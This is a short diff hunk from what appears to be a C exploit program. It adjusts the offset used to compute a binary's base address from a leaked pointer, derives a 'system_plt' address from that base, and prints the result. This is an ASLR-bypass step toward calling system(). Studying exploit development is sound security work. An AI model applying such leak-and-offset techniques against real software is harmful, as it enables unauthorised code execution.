@@ -299,7 +299,7 @@ int main()
         return 0;
     }
 
-    long long base = leak_addr - 0xc40d90 - 0x30ab20;
+    long long base = leak_addr - 0xc40d90 - 0x30ab20 + 0x50000;
     uint64_t system_plt = base + 0x2BF8C0;
 
     printf("leak elf_base address : %llx!\n", base);
